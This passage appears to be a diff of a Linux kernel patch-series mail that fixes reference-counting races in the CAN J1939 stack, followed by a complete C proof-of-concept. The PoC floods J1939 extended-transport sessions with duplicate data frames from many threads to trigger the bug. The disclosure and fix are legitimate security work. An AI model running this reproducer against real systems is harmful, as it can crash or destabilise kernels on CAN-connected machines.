-+	 *       fire j1939_ecu_tasklet_handler(&ecu->ac_tasklet) before
-+	 *       j1939_ecu_timer_handler(&ecu->ac_timer) is fired as long as
-+	 *       ecu->ac_tasklet is scheduled by previous j1939_ecu_timer_handler()
-+	 *       before ecu->ac_timer is scheduled by current j1939_ecu_timer_start()
-+	 *
-+	 * However, if something significantly delayed firing of j1939_ecu_tasklet_handler()
-+	 * enough to fire j1939_ecu_timer_handler() before j1939_ecu_tasklet_handler() is
-+	 * fired, blindly scheduling ecu->ac_tasklet will fail to drop the ref from previous
-+	 * j1939_ecu_timer_handler(). Therefore, drop the ref from current
-+	 * j1939_ecu_timer_handler() if such race condition happened.
-+	 */
-+	if (likely(!test_and_set_bit(0, &ecu->flags))) {
-+		tasklet_schedule(&ecu->ac_tasklet);
-+	} else {
-+		netdev_warn(ecu->priv->ndev,
-+			    "Skipped mapping ECU, addr: 0x%02x, name: 0x%016llx.\n",
-+			    ecu->addr, ecu->name);
-+		j1939_ecu_put(ecu);
-+	}
-+out:
-+	/* Drop the ref from j1939_ecu_timer_start(). */
-+	j1939_ecu_put(ecu);
-+	return HRTIMER_NORESTART;
-+}
-+
-+static void j1939_ecu_tasklet_handler(struct tasklet_struct *tasklet)
-+{
-+	struct j1939_ecu *ecu = container_of(tasklet, struct j1939_ecu, ac_tasklet);
- 	struct j1939_priv *priv = ecu->priv;
- 
- 	write_lock_bh(&priv->lock);
-+	/* Check if j1939_ecu_timer_cancel() was called. */
-+	if (!test_and_clear_bit(0, &ecu->flags))
-+		goto out;
- 	/* TODO: can we test if ecu->addr is unicast before starting
- 	 * the timer?
- 	 */
- 	j1939_ecu_map_locked(ecu);
--
--	/* The corresponding j1939_ecu_get() is in
--	 * j1939_ecu_timer_start().
--	 */
--	j1939_ecu_put(ecu);
-+ out:
- 	write_unlock_bh(&priv->lock);
--
--	return HRTIMER_NORESTART;
-+	/* Drop the ref from j1939_ecu_timer_handler(). */
-+	j1939_ecu_put(ecu);
- }
- 
- struct j1939_ecu *j1939_ecu_create_locked(struct j1939_priv *priv, name_t name)
-@@ -152,6 +271,13 @@ struct j1939_ecu *j1939_ecu_create_locked(struct j1939_priv *priv, name_t name)
- 
- 	lockdep_assert_held(&priv->lock);
- 
-+	/* Don't create a new ECU if netdev is no longer registered or
-+	 * __j1939_rx_release() was called.
-+	 */
-+	if (READ_ONCE(priv->ndev->reg_state) != NETREG_REGISTERED ||
-+	    !kref_read(&priv->rx_kref))
-+		return ERR_PTR(-ENODEV);
-+
- 	ecu = kzalloc_obj(*ecu, gfp_any());
- 	if (!ecu)
- 		return ERR_PTR(-ENOMEM);
-@@ -162,6 +288,7 @@ struct j1939_ecu *j1939_ecu_create_locked(struct j1939_priv *priv, name_t name)
- 
- 	hrtimer_setup(&ecu->ac_timer, j1939_ecu_timer_handler, CLOCK_MONOTONIC,
- 		      HRTIMER_MODE_REL_SOFT);
-+	tasklet_setup(&ecu->ac_tasklet, j1939_ecu_tasklet_handler);
- 	INIT_LIST_HEAD(&ecu->list);
- 
- 	j1939_priv_get(priv);
-@@ -189,8 +316,8 @@ struct j1939_ecu *j1939_ecu_get_by_addr_locked(struct j1939_priv *priv, u8 addr)
- 		return NULL;
- 
- 	ecu = j1939_ecu_find_by_addr_locked(priv, addr);
--	if (ecu)
--		j1939_ecu_get(ecu);
-+	if (ecu && !j1939_ecu_get(ecu))
-+		ecu = NULL;
- 
- 	return ecu;
- }
-@@ -215,7 +342,7 @@ static struct j1939_ecu *j1939_ecu_find_by_name_locked(struct j1939_priv *priv,
- 	lockdep_assert_held(&priv->lock);
- 
- 	list_for_each_entry(ecu, &priv->ecus, list) {
--		if (ecu->name == name)
-+		if (ecu->name == name && j1939_ecu_valid(ecu))
- 			return ecu;
- 	}
- 
-@@ -232,11 +359,12 @@ struct j1939_ecu *j1939_ecu_get_by_name_locked(struct j1939_priv *priv,
- 	if (!name)
- 		return NULL;
- 
--	ecu = j1939_ecu_find_by_name_locked(priv, name);
--	if (ecu)
--		j1939_ecu_get(ecu);
-+	list_for_each_entry(ecu, &priv->ecus, list) {
-+		if (ecu->name == name && j1939_ecu_get(ecu))
-+			return ecu;
-+	}
- 
--	return ecu;
-+	return NULL;
- }
- 
- struct j1939_ecu *j1939_ecu_get_by_name(struct j1939_priv *priv, name_t name)
-diff --git a/net/can/j1939/j1939-priv.h b/net/can/j1939/j1939-priv.h
-index cf26352d1d8c..1d3178d22548 100644
---- a/net/can/j1939/j1939-priv.h
-+++ b/net/can/j1939/j1939-priv.h
-@@ -36,12 +36,17 @@ struct j1939_ecu {
- 
- 	/* indicates that this ecu successfully claimed @sa as its address */
- 	struct hrtimer ac_timer;
-+	struct tasklet_struct ac_tasklet;
- 	struct kref kref;
- 	struct j1939_priv *priv;
- 	netdevice_tracker priv_dev_tracker;
- 
- 	/* count users, to help transport protocol decide for interaction */
- 	int nusers;
-+
-+	struct work_struct release_work;
-+	/* Bit 0: Ready to commit address change. */
-+	unsigned long flags;
- };
- 
- struct j1939_priv {
-@@ -345,4 +350,6 @@ void j1939_session_timers_cancel(struct j1939_session *session);
- /* CAN protocol */
- extern const struct can_proto j1939_can_proto;
- 
-+extern struct workqueue_struct *j1939_ecu_wq;
-+
- #endif /* _J1939_PRIV_H_ */
-diff --git a/net/can/j1939/main.c b/net/can/j1939/main.c
-index 5e5e6c228f22..22c272f8dfde 100644
---- a/net/can/j1939/main.c
-+++ b/net/can/j1939/main.c
-@@ -401,6 +401,12 @@ static __init int j1939_module_init(void)
- 
- 	pr_info("can: SAE J1939\n");
- 
-+	j1939_ecu_wq = alloc_workqueue("j1939_ecu", WQ_HIGHPRI | WQ_PERCPU, 0);
-+	if (!j1939_ecu_wq) {
-+		ret = -ENOMEM;
-+		goto fail_wq;
-+	}
-+
- 	ret = register_netdevice_notifier(&j1939_netdev_notifier);
- 	if (ret)
- 		goto fail_notifier;
-@@ -416,6 +422,8 @@ static __init int j1939_module_init(void)
-  fail_sk:
- 	unregister_netdevice_notifier(&j1939_netdev_notifier);
-  fail_notifier:
-+	destroy_workqueue(j1939_ecu_wq);
-+ fail_wq:
- 	return ret;
- }
- 
-@@ -424,6 +432,11 @@ static __exit void j1939_module_exit(void)
- 	can_proto_unregister(&j1939_can_proto);
- 
- 	unregister_netdevice_notifier(&j1939_netdev_notifier);
-+
-+	/* We need to make sure that __j1939_ecu_release_work() is
-+	 * no longer running before unmapping memory for this module.
-+	 */
-+	destroy_workqueue(j1939_ecu_wq);
- }
- 
- module_init(j1939_module_init);
+#define J1939_ETP_CMD_ABORT 0xff
+#define J1939_ETP_CMD_CTS 0x15
+#define J1939_ETP_CMD_DPO 0x16
+#define J1939_ETP_CMD_RTS 0x14
+
+#define DEFAULT_SIZE (1024U * 1024U)
+#define DEFAULT_DUPLICATES 256U
+#define DEFAULT_SESSIONS 4096U
+#define DEFAULT_THREADS 8U
+#define FIRST_BLOCK_PKTS 255U
+
+struct params {
+	const char *tx_ifname;
+	const char *rx_ifname;
+	uint32_t session_size;
+	uint32_t sessions;
+	uint32_t threads;
+	uint32_t duplicates;
+	bool verbose;
+};
+
+struct can_burst {
+	struct can_frame *frames;
+	struct mmsghdr *msgs;
+	struct iovec *iovecs;
+	unsigned int nframes;
+};
+
+struct worker_ctx {
+	int fd;
+	int cpu;
+	struct can_burst burst;
+};
+
+static pthread_barrier_t start_barrier;
+static pthread_barrier_t done_barrier;
+static volatile sig_atomic_t stop_workers;
+
+static void die(const char *what);
+
+static int sendmmsg_compat(int fd, struct mmsghdr *msgvec, unsigned int vlen,
+			   unsigned int flags)
+{
+	return syscall(SYS_sendmmsg, fd, msgvec, vlen, flags);
+}
+
+static unsigned int sendmmsg_all(int fd, struct mmsghdr *msgvec,
+				 unsigned int vlen, const char *what)
+{
+	unsigned int sent = 0;
+
+	while (sent < vlen) {
+		int ret = sendmmsg_compat(fd, &msgvec[sent], vlen - sent, 0);
+
+		if (ret < 0)
+			die(what);
+		if (!ret) {
+			errno = EIO;
+			die(what);
+		}
+		sent += ret;
+	}
+
+	return sent;
+}
+
+static void die(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void barrier_wait_or_die(pthread_barrier_t *barrier, const char *what)
+{
+	int ret = pthread_barrier_wait(barrier);
+
+	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
+		errno = ret;
+		die(what);
+	}
+}
+
+static unsigned int parse_u32(const char *arg, const char *what)
+{
+	char *endp;
+	unsigned long value;
+
+	errno = 0;
+	value = strtoul(arg, &endp, 0);
+	if (errno || *endp || value > UINT32_MAX) {
+		fprintf(stderr, "invalid %s: %s\n", what, arg);
+		exit(EXIT_FAILURE);
+	}
+
+	return (unsigned int)value;
+}
+
+static void pin_to_cpu(int cpu)
+{
+	cpu_set_t set;
+
+	CPU_ZERO(&set);
+	CPU_SET(cpu, &set);
+	if (pthread_setaffinity_np(pthread_self(), sizeof(set), &set))
+		perror("pthread_setaffinity_np");
+}
+
+static canid_t make_can_id(uint8_t prio, uint32_t pgn, uint8_t sa, uint8_t da)
+{
+	canid_t can_id;
+
+	can_id = CAN_EFF_FLAG | ((canid_t)prio << 26) | ((canid_t)pgn << 8) | sa;
+	if (((pgn >> 8) & 0xff) < 240)
+		can_id |= (canid_t)da << 8;
+
+	return can_id;
+}
+
+static int ifindex_by_name(const char *ifname)
+{
+	unsigned int ifindex = if_nametoindex(ifname);
+
+	if (!ifindex) {
+		errno = ENODEV;
+		die("if_nametoindex");
+	}
+
+	return (int)ifindex;
+}
+
+static int make_raw_socket(int ifindex)
+{
+	struct sockaddr_can addr = {
+		.can_family = AF_CAN,
+		.can_ifindex = ifindex,
+	};
+	int fd;
+	int one = 1;
+
+	fd = socket(PF_CAN, SOCK_RAW, CAN_RAW);
+	if (fd < 0)
+		die("socket(CAN_RAW)");
+
+	if (setsockopt(fd, SOL_CAN_RAW, CAN_RAW_RECV_OWN_MSGS, &one,
+		       sizeof(one)) < 0)
+		die("setsockopt(CAN_RAW_RECV_OWN_MSGS)");
+
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("bind(CAN_RAW)");
+
+	return fd;
+}
+
+static int make_j1939_listener(int ifindex)
+{
+	struct sockaddr_can addr = {
+		.can_family = AF_CAN,
+		.can_ifindex = ifindex,
+		.can_addr.j1939 = {
+			.name = 0,
+			.pgn = J1939_NO_PGN,
+			.addr = LOCAL_SA,
+		},
+	};
+	int fd;
+
+	fd = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
+	if (fd < 0)
+		die("socket(CAN_J1939)");
+
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("bind(CAN_J1939)");
+
+	return fd;
+}
+
+static void send_frame(int fd, const struct can_frame *frame)
+{
+	ssize_t written = write(fd, frame, sizeof(*frame));
+
+	if (written != (ssize_t)sizeof(*frame))
+		die("write(can_frame)");
+}
+
+static void build_etp_rts(struct can_frame *frame, uint8_t sa, uint8_t da,
+			  uint32_t size, uint32_t app_pgn)
+{
+	memset(frame, 0, sizeof(*frame));
+	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
+	frame->len = 8;
+	frame->data[0] = J1939_ETP_CMD_RTS;
+	frame->data[1] = (size >> 0) & 0xff;
+	frame->data[2] = (size >> 8) & 0xff;
+	frame->data[3] = (size >> 16) & 0xff;
+	frame->data[4] = (size >> 24) & 0xff;
+	frame->data[5] = (app_pgn >> 0) & 0xff;
+	frame->data[6] = (app_pgn >> 8) & 0xff;
+	frame->data[7] = (app_pgn >> 16) & 0xff;
+}
+
+static void build_etp_dpo(struct can_frame *frame, uint8_t sa, uint8_t da,
+			  uint32_t app_pgn)
+{
+	memset(frame, 0, sizeof(*frame));
+	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
+	frame->len = 8;
+	frame->data[0] = J1939_ETP_CMD_DPO;
+	frame->data[1] = FIRST_BLOCK_PKTS;
+	frame->data[2] = 0;
+	frame->data[3] = 0;
+	frame->data[4] = 0;
+	frame->data[5] = (app_pgn >> 0) & 0xff;
+	frame->data[6] = (app_pgn >> 8) & 0xff;
+	frame->data[7] = (app_pgn >> 16) & 0xff;
+}
+
+static void build_etp_abort(struct can_frame *frame, uint8_t sa, uint8_t da,
+			    uint32_t app_pgn)
+{
+	memset(frame, 0, sizeof(*frame));
+	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
+	frame->len = 8;
+	frame->data[0] = J1939_ETP_CMD_ABORT;
+	frame->data[1] = 1;
+	frame->data[2] = 0xff;
+	frame->data[3] = 0xff;
+	frame->data[4] = 0xff;
+	frame->data[5] = (app_pgn >> 0) & 0xff;
+	frame->data[6] = (app_pgn >> 8) & 0xff;
+	frame->data[7] = (app_pgn >> 16) & 0xff;
+}
+
+static void build_etp_terminal_data(struct can_frame *frame, uint8_t remote_sa)
+{
+	memset(frame, 0, sizeof(*frame));
+	frame->can_id = make_can_id(6, J1939_ETP_PGN_DAT, remote_sa, LOCAL_SA);
+	frame->len = 8;
+	frame->data[0] = FIRST_BLOCK_PKTS;
+	memset(&frame->data[1], 'Z', 7);
+}
+
+static void free_burst(struct can_burst *burst)
+{
+	free(burst->iovecs);
+	free(burst->msgs);
+	free(burst->frames);
+	memset(burst, 0, sizeof(*burst));
+}
+
+static void drain_raw_rx(int fd)
+{
+	struct pollfd pfd = {
+		.fd = fd,
+		.events = POLLIN,
+	};
+
+	for (;;) {
+		struct can_frame frame;
+		int ret = poll(&pfd, 1, 0);
+
+		if (ret <= 0)
+			return;
+
+		if (read(fd, &frame, sizeof(frame)) < 0) {
+			if (errno == EAGAIN || errno == EWOULDBLOCK)
+				return;
+			die("read(raw drain)");
+		}
+	}
+}
+
+static bool match_ctl_cmd(const struct can_frame *frame, uint8_t sa, uint8_t da,
+			  uint32_t pgn, uint8_t cmd)
+{
+	uint32_t frame_pgn;
+	uint8_t frame_sa;
+	uint8_t frame_da = J1939_NO_ADDR;
+
+	if (!(frame->can_id & CAN_EFF_FLAG))
+		return false;
+
+	frame_sa = frame->can_id & 0xff;
+	frame_pgn = (frame->can_id >> 8) & J1939_PGN_MAX;
+	if (((frame_pgn >> 8) & 0xff) < 240) {
+		frame_da = frame_pgn & 0xff;
+		frame_pgn &= J1939_PGN_PDU1_MAX;
+	}
+
+	return frame_sa == sa && frame_da == da &&
+	       frame_pgn == pgn && frame->len >= 1 &&
+	       frame->data[0] == cmd;
+}
+
+static bool wait_for_cts(int raw_fd, uint8_t remote_sa, uint32_t app_pgn,
+			 bool verbose)
+{
+	struct pollfd pfd = {
+		.fd = raw_fd,
+		.events = POLLIN,
+	};
+	struct timespec start;
+
+	if (clock_gettime(CLOCK_MONOTONIC, &start) < 0)
+		die("clock_gettime");
+
+	for (;;) {
+		struct can_frame frame;
+		struct timespec now;
+		int elapsed_ms;
+		int timeout_ms;
+		int ret;
+
+		if (clock_gettime(CLOCK_MONOTONIC, &now) < 0)
+			die("clock_gettime");
+
+		elapsed_ms = (int)((now.tv_sec - start.tv_sec) * 1000 +
+				   (now.tv_nsec - start.tv_nsec) / 1000000);
+		timeout_ms = 1000 - elapsed_ms;
+		if (timeout_ms <= 0)
+			return false;
+
+		ret = poll(&pfd, 1, timeout_ms);
+		if (ret < 0)
+			die("poll(raw)");
+		if (ret == 0)
+			return false;
+
+		if (!(pfd.revents & POLLIN))
+			continue;
+
+		if (read(raw_fd, &frame, sizeof(frame)) < 0)
+			die("read(raw)");
+
+		if (match_ctl_cmd(&frame, LOCAL_SA, remote_sa, J1939_ETP_PGN_CTL,
+				  J1939_ETP_CMD_CTS)) {
+			if (verbose) {
+				printf("saw initial CTS for pgn=0x%05x remote_sa=0x%02x\n",
+				       app_pgn, remote_sa);
+				fflush(stdout);
+			}
+			return true;
+		}
+	}
+}
+
+static void init_burst(struct can_burst *burst, unsigned int nframes)
+{
+	memset(burst, 0, sizeof(*burst));
+	burst->nframes = nframes;
+	burst->frames = calloc(nframes, sizeof(*burst->frames));
+	burst->msgs = calloc(nframes, sizeof(*burst->msgs));
+	burst->iovecs = calloc(nframes, sizeof(*burst->iovecs));
+	if (!burst->frames || !burst->msgs || !burst->iovecs)
+		die("calloc(burst)");
+}
+
+static void finalize_burst(struct can_burst *burst)
+{
+	unsigned int i;
+
+	for (i = 0; i < burst->nframes; i++) {
+		burst->iovecs[i].iov_base = &burst->frames[i];
+		burst->iovecs[i].iov_len = sizeof(burst->frames[i]);
+		burst->msgs[i].msg_hdr.msg_iov = &burst->iovecs[i];
+		burst->msgs[i].msg_hdr.msg_iovlen = 1;
+	}
+}
+
+static void build_prefix_burst(struct can_burst *burst, uint8_t remote_sa,
+			       uint32_t app_pgn)
+{
+	unsigned int i;
+
+	init_burst(burst, FIRST_BLOCK_PKTS);
+	build_etp_dpo(&burst->frames[0], remote_sa, LOCAL_SA, app_pgn);
+
+	for (i = 1; i < FIRST_BLOCK_PKTS; i++) {
+		memset(&burst->frames[i], 0, sizeof(burst->frames[i]));
+		burst->frames[i].can_id = make_can_id(6, J1939_ETP_PGN_DAT,
+						      remote_sa, LOCAL_SA);
+		burst->frames[i].len = 8;
+		burst->frames[i].data[0] = i;
+		memset(&burst->frames[i].data[1], 'A' + (i % 26), 7);
+	}
+
+	finalize_burst(burst);
+}
+
+static void build_terminal_burst(struct can_burst *burst, uint8_t remote_sa,
+				 unsigned int duplicates)
+{
+	unsigned int i;
+
+	free_burst(burst);
+	init_burst(burst, duplicates);
+
+	for (i = 0; i < duplicates; i++)
+		build_etp_terminal_data(&burst->frames[i], remote_sa);
+
+	finalize_burst(burst);
+}
+
+static void *worker_main(void *arg)
+{
+	struct worker_ctx *ctx = arg;
+
+	pin_to_cpu(ctx->cpu);
+
+	for (;;) {
+		barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start)");
+		if (stop_workers)
+			break;
+
+		sendmmsg_all(ctx->fd, ctx->burst.msgs, ctx->burst.nframes,
+			     "sendmmsg(worker)");
+
+		barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done)");
+	}
+
+	return NULL;
+}
+
+static void init_workers(struct worker_ctx *workers, pthread_t *tids,
+			 int ifindex, unsigned int threads, int ncpus)
+{
+	unsigned int i;
+
+	if (pthread_barrier_init(&start_barrier, NULL, threads + 1))
+		die("pthread_barrier_init(start)");
+	if (pthread_barrier_init(&done_barrier, NULL, threads + 1))
+		die("pthread_barrier_init(done)");
+
+	for (i = 0; i < threads; i++) {
+		workers[i].fd = make_raw_socket(ifindex);
+		workers[i].cpu = i % ncpus;
+		if (pthread_create(&tids[i], NULL, worker_main, &workers[i]))
+			die("pthread_create");
+	}
+}
+
+static void join_workers(struct worker_ctx *workers, pthread_t *tids,
+			 unsigned int threads)
+{
+	unsigned int i;
+
+	stop_workers = 1;
+	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(stop)");
+
+	for (i = 0; i < threads; i++) {
+		if (pthread_join(tids[i], NULL))
+			die("pthread_join");
+		free_burst(&workers[i].burst);
+		close(workers[i].fd);
+	}
+
+	pthread_barrier_destroy(&start_barrier);
+	pthread_barrier_destroy(&done_barrier);
+}
+
+static void run_session(int raw_fd, struct worker_ctx *workers,
+			uint32_t size, uint32_t threads, uint32_t duplicates,
+			uint32_t session_idx, bool verbose)
+{
+	struct can_frame rts;
+	struct can_frame abort;
+	struct can_burst prefix = { 0 };
+	uint8_t remote_sa;
+	uint32_t app_pgn;
+	unsigned int i;
+	unsigned int sa_span = J1939_MAX_UNICAST_ADDR - REMOTE_SA_BASE + 1;
+
+	remote_sa = REMOTE_SA_BASE + (session_idx % sa_span);
+	app_pgn = APP_PGN_BASE + (session_idx % 0x100);
+
+	build_etp_rts(&rts, remote_sa, LOCAL_SA, size, app_pgn);
+	send_frame(raw_fd, &rts);
+
+	if (!wait_for_cts(raw_fd, remote_sa, app_pgn, verbose)) {
+		fprintf(stderr,
+			"timed out waiting for initial CTS: session=%u remote_sa=0x%02x pgn=0x%05x size=%u\n",
+			session_idx, remote_sa, app_pgn, size);
+		exit(EXIT_FAILURE);
+	}
+
+	build_prefix_burst(&prefix, remote_sa, app_pgn);
+	/* Ensure the receiver processes DPO before the data packet burst. */
+	send_frame(raw_fd, &prefix.frames[0]);
+	usleep(1000);
+	sendmmsg_all(raw_fd, &prefix.msgs[1], prefix.nframes - 1,
+		     "sendmmsg(prefix)");
+	free_burst(&prefix);
+
+	for (i = 0; i < threads; i++)
+		build_terminal_burst(&workers[i].burst, remote_sa, duplicates);
+
+	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start-main)");
+	barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done-main)");
+
+	build_etp_abort(&abort, remote_sa, LOCAL_SA, app_pgn);
+	send_frame(raw_fd, &abort);
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"usage: %s [tx_ifname] [rx_ifname] [size] [sessions] [threads] [duplicates_per_thread] [verbose]\n",
+		prog);
+	exit(EXIT_FAILURE);
+}
+
+int main(int argc, char **argv)
+{
+	struct params params = {
+		.tx_ifname = "vcan0",
+		.rx_ifname = "vcan0",
+		.session_size = DEFAULT_SIZE,
+		.sessions = DEFAULT_SESSIONS,
+		.threads = DEFAULT_THREADS,
+		.duplicates = DEFAULT_DUPLICATES,
+		.verbose = false,
+	};
+	struct worker_ctx *workers;
+	pthread_t *tids;
+	int ifindex;
+	int rx_ifindex;
+	int raw_fd;
+	int j1939_fd;
+	int ncpus;
+	unsigned int i;
+
+	if (argc > 8)
+		usage(argv[0]);
+
+	if (argc >= 2)
+		params.tx_ifname = argv[1];
+	if (argc >= 3)
+		params.rx_ifname = argv[2];
+	if (argc >= 4)
+		params.session_size = parse_u32(argv[3], "size");
+	if (argc >= 5)
+		params.sessions = parse_u32(argv[4], "sessions");
+	if (argc >= 6)
+		params.threads = parse_u32(argv[5], "threads");
+	if (argc >= 7)
+		params.duplicates = parse_u32(argv[6], "duplicates");
+	if (argc >= 8)
+		params.verbose = parse_u32(argv[7], "verbose") != 0;
+
+	if (params.session_size <= 1785) {
+		fprintf(stderr, "size must be > 1785 to force ETP\n");
+		return EXIT_FAILURE;
+	}
+	if (!params.sessions || !params.threads || !params.duplicates)
+		usage(argv[0]);
+
+	ncpus = sysconf(_SC_NPROCESSORS_ONLN);
+	if (ncpus < 1)
+		die("sysconf(_SC_NPROCESSORS_ONLN)");
+
+	workers = calloc(params.threads, sizeof(*workers));
+	tids = calloc(params.threads, sizeof(*tids));
+	if (!workers || !tids)
+		die("calloc(workers)");
+
+	ifindex = ifindex_by_name(params.tx_ifname);
+	rx_ifindex = ifindex_by_name(params.rx_ifname);
+	j1939_fd = make_j1939_listener(rx_ifindex);
+	raw_fd = make_raw_socket(ifindex);
+	init_workers(workers, tids, ifindex, params.threads, ncpus);
+
+	printf("tx_if=%s(%d) rx_if=%s(%d) size=%u sessions=%u threads=%u duplicates_per_thread=%u\n",
+	       params.tx_ifname, ifindex, params.rx_ifname, rx_ifindex,
+	       params.session_size, params.sessions, params.threads,
+	       params.duplicates);
+	fflush(stdout);
+
+	for (i = 0; i < params.sessions; i++) {
+		drain_raw_rx(raw_fd);
+		run_session(raw_fd, workers, params.session_size, params.threads,
+			    params.duplicates, i, params.verbose);
+		if ((i + 1) % 16 == 0 || params.verbose) {
+			printf("completed %u sessions\n", i + 1);
+			fflush(stdout);
+		}
+	}
+
+	join_workers(workers, tids, params.threads);
+	close(raw_fd);
+	close(j1939_fd);
+	free(tids);
+	free(workers);
+
+	return 0;
+}
+------END PoC--------
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (2):
+  can: j1939: account for timer references across rearm
+  can: j1939: serialize TX with session shutdown
+
+ net/can/j1939/j1939-priv.h |  14 +
+ net/can/j1939/transport.c  | 579 +++++++++++++++++++++++++++++++------
+ 2 files changed, 508 insertions(+), 85 deletions(-)
+
 -- 
-2.56.0
+2.43.0
 
